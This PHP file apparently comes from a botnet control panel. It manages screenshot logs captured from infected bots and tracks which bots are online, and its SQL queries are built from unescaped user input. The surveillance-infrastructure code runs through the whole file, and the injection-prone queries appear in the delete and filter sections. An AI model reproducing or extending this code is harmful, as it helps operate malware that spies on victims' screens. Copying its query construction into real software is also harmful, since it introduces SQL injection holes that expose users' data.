<?php

get_function('html_pages');
get_function('size_format');
get_function('strtotime');
get_function('smarty_assign_add');

$_SESSION['user']->config['cp']['logs'] = 10;

function del_file($row){
	@unlink(realpath('logs/screens/' . $row->file));
}

if(!empty($Cur['x'])){
	$matches = explode('0', $Cur['x'], 2);
	if(!empty($matches[0]) && !empty($matches[1])){
		$prefix = $matches[0];
		$uid = '0' . $matches[1];
	}
	
	$mysqli->query('SELECT file FROM bf_screens_logs WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') AND (file != \'\')', null, 'del_file');
	$mysqli->query('delete from bf_screens_logs where (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\')');
	
	header('Location: /logs/screen.html');
	exit;
}

if(isset($_POST['search'])){
	unset($_POST['search']);

	foreach($_POST as $k => $p){
		if($_SESSION['search']['screen'][$k] != $p) $_SESSION['search']['screen'][$k] = $p;
	}
}

$filter = '';

if(!empty($_SESSION['user']->config['prefix'])){
	if(!empty($sl['puid'])){
		$value = explode('0', $sl['puid'], 2);
		if($value[0] != $_SESSION['user']->config['prefix']) $sl['puid'] = '';
	}else{
		if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
		$filter .= ' (a.prefix = \''.$_SESSION['user']->config['prefix'].'\') ';
	}
}

foreach($_SESSION['search']['screen'] as $key => $value){
	if(!empty($value)){
		switch($key){
			case 'puid':
				if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
				$value = explode('0', $value, 2);
				$filter .= ' (a.prefix = \''.$value[0].'\') AND (a.uid = \'0'.$value[1].'\') ';
			break;
			
                        case 'type':
				if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
				$filter .= ' (a.type = \''.$value.'\') ';
			break;
		}
	}
}

function types($row){
	global $types;
	//$logs[$row->dbname][$row->prefix . $row->uid][$row->type]['date'] = @file_get_contents('cache/logs/' . $row->dbname);
	$types[$row->type] = $row->type;
}

$items = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, count(a.id) count FROM bf_screens_logs a '.$filter.' GROUP by a.prefix, a.uid LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['logs'] : $Cur['page']*$_SESSION['user']->config['cp']['logs'] . ',' . $_SESSION['user']->config['cp']['logs']), null, null, false);
$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(concat( a.prefix, a.uid ))) count FROM bf_screens_logs a '.$filter, null, 'count', 0, true);

$types = array();
$mysqli->query('SELECT DISTINCT(a.type) type FROM bf_screens_logs a', null, 'types', false);

$smarty->assign("items", $items);
$smarty->assign("counts", $counts);
$smarty->assign("types", $types);

if(!file_exists('cache/online_bot.json') || (time() - filemtime('cache/online_bot.json')) >= ($config['live']*60)){
	$online = array();
	function online_check($row){
		global $online;
		$online[$row->prefix][$row->uid] = 1;
	}
	$mysqli->query('SELECT prefix, uid FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\')', null, 'online_check');
	file_put_contents('cache/online_bot.json', json_encode($online));
}else{
	$online = json_decode(file_get_contents('cache/online_bot.json'), true);
}
$smarty->assign("online", $online);

?>